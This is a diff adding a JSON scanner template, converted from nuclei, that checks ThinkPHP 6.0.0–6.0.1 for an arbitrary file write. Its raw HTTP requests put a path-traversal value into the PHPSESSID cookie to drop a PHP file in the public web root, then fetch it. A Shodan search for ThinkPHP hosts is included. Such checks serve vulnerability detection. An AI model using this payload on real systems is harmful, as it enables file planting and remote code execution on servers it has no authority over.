@@ -1,0 +1,146 @@
+{
+  "id": "thinkphp6-arbitrary-write",
+  "name": "ThinkPHP 6.0.0~6.0.1 - Arbitrary File Write",
+  "author": "arliya",
+  "severity": "CRITICAL",
+  "description": "ThinkPHP 6.0.0~6.0.1 is susceptible to remote code execution. An attacker can upload any script file through this vulnerability to realize remote code execution takeover.We inject payload into PHPSESSID. In the buggy version, the payload is url encoded and returned as it is. In the fixed version, the payload is returned as a 32-bit hexadecimal string\n",
+  "references": [
+    "- https://community.f5.com/t5/technical-articles/thinkphp-6-0-0-6-0-1-arbitrary-file-write-vulnerability/ta-p/281591\n- https://github.com/Loneyers/ThinkPHP6_Anyfile_operation_write\n- https://github.com/zan8in/afrog/blob/main/pocs/afrog-pocs/vulnerability/thinkphp-v6-file-write.yaml\n"
+  ],
+  "tags": [
+    "thinkphp",
+    "file-upload",
+    "rce"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "title:\"ThinkPHP\""
+  },
+  "variables": {
+    "random_filename": [
+      "{{to_lower(rand_base(11))}}"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET / HTTP/1.1\nHost: {{Hostname}}\nCookie: PHPSESSID\u003d/../../../public/{{random_filename}}.php\nContent-Type: application/x-www-form-urlencoded\n",
+        "GET /{{random_filename}}.php HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "header_1",
+          "values": [
+            "Set-Cookie: PHPSESSID\u003d%2F..%2F..%2F..%2Fpublic%2F{{random_filename}}.php"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "DSL",
+          "values": [
+            "status_2 \u003d\u003d 200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "thinkphp6-arbitrary-write",
+    "info": {
+      "name": "ThinkPHP 6.0.0~6.0.1 - Arbitrary File Write",
+      "author": "arliya",
+      "severity": "critical",
+      "description": "ThinkPHP 6.0.0~6.0.1 is susceptible to remote code execution. An attacker can upload any script file through this vulnerability to realize remote code execution takeover.We inject payload into PHPSESSID. In the buggy version, the payload is url encoded and returned as it is. In the fixed version, the payload is returned as a 32-bit hexadecimal string\n",
+      "reference": "- https://community.f5.com/t5/technical-articles/thinkphp-6-0-0-6-0-1-arbitrary-file-write-vulnerability/ta-p/281591\n- https://github.com/Loneyers/ThinkPHP6_Anyfile_operation_write\n- https://github.com/zan8in/afrog/blob/main/pocs/afrog-pocs/vulnerability/thinkphp-v6-file-write.yaml\n",
+      "classification": {},
+      "metadata": {
+        "max_request": 2,
+        "shodan_query": "title:\"ThinkPHP\""
+      },
+      "tags": "thinkphp,file-upload,rce"
+    },
+    "variables": {
+      "random_filename": "{{to_lower(rand_base(11))}}"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET / HTTP/1.1\nHost: {{Hostname}}\nCookie: PHPSESSID\u003d/../../../public/{{random_filename}}.php\nContent-Type: application/x-www-form-urlencoded\n",
+          "GET /{{random_filename}}.php HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "header_1",
+            "words": [
+              "Set-Cookie: PHPSESSID\u003d%2F..%2F..%2F..%2Fpublic%2F{{random_filename}}.php"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_2 \u003d\u003d 200"
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
